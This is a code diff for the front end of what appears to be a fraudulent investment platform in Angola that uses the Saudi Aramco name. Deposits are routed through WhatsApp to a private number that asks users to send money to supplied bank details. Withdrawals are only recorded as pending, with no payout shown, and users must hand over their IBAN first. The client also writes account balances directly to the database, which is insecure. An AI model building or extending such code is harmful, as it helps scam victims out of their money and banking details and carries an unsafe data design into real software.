+function fKz(v){return Number(v).toLocaleString('pt-AO',{minimumFractionDigits:2,maximumFractionDigits:2})+' Kz';}
+
+function initPage(){
+  const bal=window._userBalance||0;
+  document.getElementById('headerBal').textContent=fKz(bal);
+  loadHistory();
+}
+
+/* ---- Amount input: grows right to left ---- */
+function handleAmountInput(input,ctx){
+  let raw=input.value.replace(/\D/g,'');
+  if(!raw)raw='0';
+  let num=parseInt(raw,10);
+  let formatted=(num/100).toFixed(2);
+  input.value=formatted;
+  if(ctx==='dep') checkPlanMatch();
+  if(ctx==='wd') updateWdConfirm();
+}
+
+function checkPlanMatch(){
+  const val=parseFloat(document.getElementById('depAmountInput').value)||0;
+  const match=PLANS.slice().reverse().find(p=>val>=p.price);
+  const el=document.getElementById('depPlanMatch');
+  if(match){
+    el.style.display='flex';
+    document.getElementById('depPlanMatchText').textContent='Plano correspondente: '+match.name;
+  } else {
+    el.style.display='none';
+  }
+}
+
+/* ---- Deposit Steps ---- */
+let depStep=1;
+function openDepositModal(){
+  depStep=1;setDepStep(1);
+  document.getElementById('depositModal').style.display='flex';
+  document.body.style.overflow='hidden';
+}
+function closeDepModal(){document.getElementById('depositModal').style.display='none';document.body.style.overflow='';}
+
+function setDepStep(s){
+  [1,2,3].forEach(i=>{
+    document.getElementById('dds'+i).className='dep-step'+(i<s?' done':i===s?' active':'');
+    document.getElementById('ddc'+i).innerHTML=i<s?'<svg viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="3" width="12" height="12"><polyline points="20 6 9 17 4 12"/></svg>':i;
+    document.getElementById('depPanel'+i).style.display=i===s?'block':'none';
+  });
+  document.getElementById('depBtnBack').style.display=s>1?'flex':'none';
+  const txts=['Entendi, Continuar','Continuar','Falar com Gerente'];
+  document.getElementById('depBtnTxt').textContent=txts[s-1];
+}
+
+function depBack(){if(depStep>1){depStep--;setDepStep(depStep);}}
+function depNext(){
+  if(depStep===1){depStep=2;setDepStep(2);}
+  else if(depStep===2){
+    const v=parseFloat(document.getElementById('depAmountInput').value)||0;
+    if(v<3995){showPopup('warning','Valor insuficiente','O valor minimo de deposito e 3.995,00 Kz.');return;}
+    fillDepConfirm(v);depStep=3;setDepStep(3);
+  } else {
+    sendDepositWA();
+  }
+}
+
+function fillDepConfirm(val){
+  const d=window._userData||{};
+  const match=PLANS.slice().reverse().find(p=>val>=p.price);
+  document.getElementById('depCName').textContent=d.name||'—';
+  document.getElementById('depCId').textContent=d.accountId||'—';
+  document.getElementById('depCVal').textContent=fKz(val);
+  document.getElementById('depCPlan').textContent=match?match.name:'Sem plano correspondente';
+  document.getElementById('depCTel').textContent=d.phone1||'—';
+}
+
+function sendDepositWA(){
+  const d=window._userData||{};
+  const val=parseFloat(document.getElementById('depAmountInput').value)||0;
+  const match=PLANS.slice().reverse().find(p=>val>=p.price);
+  const name=d.name||'Investidor';
+  const id=d.accountId||'—';
+  const tel=(d.phone1||'—').replace('+244','').trim();
+  const planName=match?match.name:'—';
+  const msg=encodeURIComponent(`Ola senhor/a sou ${name} meu id ${id} telefone principal +244${tel} gostei e pretendo fazer parte da plataforma de investimentos Saudi Aramco\n\nPretendo iniciar no plano ${planName} no valor de ${fKz(val)} por favor Envie-me os dados bancarios afim de finalizar ja o deposito.`);
+  closeDepModal();
+  showPopup('success','Redirecionando','A abrir WhatsApp com o gerente...');
+  setTimeout(()=>window.open(`https://wa.me/244925768626?text=${msg}`,'_blank'),700);
+}
+
+/* ---- History ---- */
+function toggleHistory(){
+  const panel=document.getElementById('historyPanel');
+  const btn=document.getElementById('historyToggleBtn');
+  const open=panel.classList.toggle('open');
+  btn.classList.toggle('open',open);
+}
+
+async function loadHistory(){
+  const db=window._db;const user=window._currentUser;
+  if(!db||!user)return;
+  try{
+    const {collection,query,orderBy,getDocs}=window._dbFuncs;
+    const q=query(collection(db,'withdrawals_'+user.uid),orderBy('createdAt','desc'));
+    const snap=await getDocs(q).catch(()=>null);
+    if(!snap||snap.empty){return;}
+    const list=document.getElementById('historyList');
+    list.innerHTML=snap.docs.map(d=>{
+      const data=d.data();
+      const date=data.createdAt?new Date(data.createdAt.seconds*1000).toLocaleDateString('pt-AO'):'—';
+      return `<div class="history-item"><div class="history-dot ${data.status||'pending'}"></div><div class="history-body"><div class="history-desc">Levantamento</div><div class="history-meta">${date} &middot; ${data.status==='success'?'Processado':data.status==='failed'?'Falhado':'Pendente'}</div></div><div class="history-val out">${fKz(data.amount||0)}</div></div>`;
+    }).join('');
+  }catch(e){}
+}
+
+/* ---- Withdraw Flow ---- */
+async function openWithdrawFlow(){
+  document.getElementById('withdrawModal').style.display='flex';
+  document.body.style.overflow='hidden';
+  document.getElementById('wdChecks').style.display='block';
+  document.getElementById('wdBankForm').style.display='none';
+  document.getElementById('wdBankOk').style.display='none';
+  document.getElementById('wdNoInv').style.display='none';
+  document.getElementById('wdFooter').style.display='none';
+  document.getElementById('wdConfirmBtn').style.display='none';
+  document.getElementById('wdSaveBankBtn').style.display='none';
+  document.getElementById('wdGoBuyBtn').style.display='none';
+  document.getElementById('wdTitle').textContent='Levantamento';
+  document.getElementById('wdSub').textContent='A verificar a sua conta...';
+
+  // Reset circles to loading
+  ['wdCircle1','wdCircle2'].forEach(id=>{
+    const el=document.getElementById(id);
+    el.className='wd-check-circle';
+    el.innerHTML='<div class="wd-check-ring"></div>';
+  });
+  document.getElementById('wdSub1').textContent='A verificar o seu plano de investimento...';
+  document.getElementById('wdSub2').textContent='A verificar dados bancarios...';
+
+  const d=window._userData||{};
+
+  // Check 1: active investment
+  await delay(1200);
+  const hasInv=!!(d.activeInvestment);
+  const c1=document.getElementById('wdCircle1');
+  c1.innerHTML=hasInv
+    ?'<svg viewBox="0 0 24 24" fill="none" stroke="#10b981" stroke-width="2.5"><polyline points="20 6 9 17 4 12"/></svg>'
+    :'<svg viewBox="0 0 24 24" fill="none" stroke="#ef4444" stroke-width="2.5"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>';
+  c1.className='wd-check-circle '+(hasInv?'done':'fail');
+  document.getElementById('wdSub1').textContent=hasInv?'Plano ativo encontrado.':'Nenhum plano de investimento ativo.';
+
+  // Check 2: bank account
+  await delay(900);
+  const hasBank=!!(d.bankLinked&&d.bankName);
+  const c2=document.getElementById('wdCircle2');
+  c2.innerHTML=hasBank
+    ?'<svg viewBox="0 0 24 24" fill="none" stroke="#10b981" stroke-width="2.5"><polyline points="20 6 9 17 4 12"/></svg>'
+    :'<svg viewBox="0 0 24 24" fill="none" stroke="#f59e0b" stroke-width="2.5"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>';
+  c2.className='wd-check-circle '+(hasBank?'done':'');
+  document.getElementById('wdSub2').textContent=hasBank?'Conta bancaria vinculada.':'Sem conta bancaria registada.';
+
+  document.getElementById('wdFooter').style.display='flex';
+
+  if(!hasInv){
+    await delay(400);
+    document.getElementById('wdChecks').style.display='none';
+    document.getElementById('wdNoInv').style.display='block';
+    document.getElementById('wdGoBuyBtn').style.display='flex';
+    return;
+  }
+
+  await delay(500);
+  document.getElementById('wdChecks').style.display='none';
+
+  if(!hasBank){
+    document.getElementById('wdBankForm').style.display='block';
+    document.getElementById('wdSaveBankBtn').style.display='flex';
+    document.getElementById('wdSub').textContent='Vincule uma conta bancaria';
+  } else {
+    showWithdrawForm();
+  }
+}
+
+function showWithdrawForm(){
+  const d=window._userData||{};
+  document.getElementById('wdBankOk').style.display='block';
+  document.getElementById('wdConfirmBtn').style.display='flex';
+  document.getElementById('wdSub').textContent='Insira o valor a levantar';
+  document.getElementById('wdCName').textContent=d.name||'—';
+  document.getElementById('wdCId').textContent=d.accountId||'—';
+  document.getElementById('wdCBank').textContent=d.bankName||'—';
+  document.getElementById('wdAvail').textContent=fKz(window._userBalance||0);
+}
+
+function updateWdConfirm(){
+  const v=parseFloat(document.getElementById('wdAmountInput').value)||0;
+  document.getElementById('wdCVal').textContent=fKz(v);
+}
+
+/* ---- IBAN ---- */
+function handleIban(n){
+  let inp=document.getElementById('ibanInput'+n);
+  let raw=inp.value.replace(/\D/g,'');
+  // format with dots every 4 digits
+  let fmt='';
+  for(let i=0;i<raw.length;i++){
+    if(i>0&&i%4===0)fmt+='.';
+    fmt+=raw[i];
+  }
+  inp.value=fmt;
+  const digits=raw.length;
+  document.getElementById('ibanCount'+n).textContent=digits+'/21';
+
+  const v1=document.getElementById('ibanInput1').value;
+  const v2=document.getElementById('ibanInput2').value;
+  const match=v1===v2&&v1.replace(/\D/g,'').length===21;
+
+  if(n===2||v2){
+    document.getElementById('ibanInput1').className='iban-input '+(match?'match':(v2?'mismatch':''));
+    document.getElementById('ibanInput2').className='iban-input '+(match?'match':(v2?'mismatch':''));
+  }
+  document.getElementById('wdSaveBankBtn').disabled=!match||!document.getElementById('bankName').value.trim();
+}
+
+async function saveBank(){
+  const v1=document.getElementById('ibanInput1').value;
+  const bankName=document.getElementById('bankName').value.trim();
+  if(!bankName){showPopup('warning','Nome do banco','Insira o nome do banco.');return;}
+  const btn=document.getElementById('wdSaveBankBtn');
+  btn.disabled=true;
+  document.getElementById('bankSpinner').style.display='block';
+  btn.querySelector('span').style.display='none';
+
+  try{
+    const{doc,updateDoc}=window._dbFuncs;
+    await updateDoc(doc(window._db,'users',window._currentUser.uid),{
+      bankLinked:true,bankIban:'AO06'+v1.replace(/\D/g,''),bankName,
+    });
+    window._userData.bankLinked=true;
+    window._userData.bankName=bankName;
+    showPopup('success','Conta guardada','Dados bancarios registados com sucesso.');
+    document.getElementById('wdBankForm').style.display='none';
+    document.getElementById('wdSaveBankBtn').style.display='none';
+    showWithdrawForm();
+  }catch(e){
+    showPopup('error','Erro','Nao foi possivel guardar. Tente novamente.');
+    btn.disabled=false;
+  }
+  document.getElementById('bankSpinner').style.display='none';
+  btn.querySelector('span').style.display='inline';
+}
+
+async function submitWithdraw(){
+  const val=parseFloat(document.getElementById('wdAmountInput').value)||0;
+  const avail=window._userBalance||0;
+  if(val<100){showPopup('warning','Valor minimo','O valor minimo de levantamento e 100,00 Kz.');return;}
+  if(val>avail){showPopup('error','Saldo insuficiente','O seu saldo disponivel e insuficiente para este levantamento.');return;}
+
+  const btn=document.getElementById('wdConfirmBtn');
+  btn.disabled=true;
+  document.getElementById('wdSpinner').style.display='block';
+  document.getElementById('wdConfirmTxt').style.display='none';
+
+  try{
+    const{addDoc,collection,updateDoc,doc,serverTimestamp}=window._dbFuncs;
+    const uid=window._currentUser.uid;
+    await addDoc(collection(window._db,'withdrawals_'+uid),{amount:val,status:'pending',createdAt:serverTimestamp()});
+    const newBal=avail-val;
+    await updateDoc(doc(window._db,'users',uid),{balance:newBal});
+    window._userBalance=newBal;
+    document.getElementById('headerBal').textContent=fKz(newBal);
+    closeWdModal();
+    showPopup('success','Solicitacao enviada','O seu pedido de levantamento foi registado. Sera processado em 1 a 3 dias uteis.');
+    loadHistory();
+  }catch(e){
+    showPopup('error','Erro','Nao foi possivel processar. Tente novamente.');
+    btn.disabled=false;
+  }
+  document.getElementById('wdSpinner').style.display='none';
+  document.getElementById('wdConfirmTxt').style.display='inline';
+}
+
+function closeWdModal(){document.getElementById('withdrawModal').style.display='none';document.body.style.overflow='';}
+function delay(ms){return new Promise(r=>setTimeout(r,ms));}
+
+/* POPUP */
+const pIcons={success:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="20 6 9 17 4 12"/></svg>',error:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/></svg>',info:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>',warning:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>'};
+function showPopup(type,title,msg,dur=4000){
+  const c=document.getElementById('popupContainer');
+  const p=document.createElement('div');p.className='popup '+type;
+  p.innerHTML=`<div class="popup-icon">${pIcons[type]||pIcons.info}</div><div style="flex:1"><div class="popup-title">${title}</div><div class="popup-msg">${msg}</div></div><button class="popup-close" onclick="this.parentElement.remove()"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>`;
+  c.appendChild(p);requestAnimationFrame(()=>p.classList.add('show'));
+  setTimeout(()=>{p.classList.add('hide');setTimeout(()=>p.remove(),400);},dur);
+}
+window.initPage=initPage;
+</script>
+</body>
+</html>
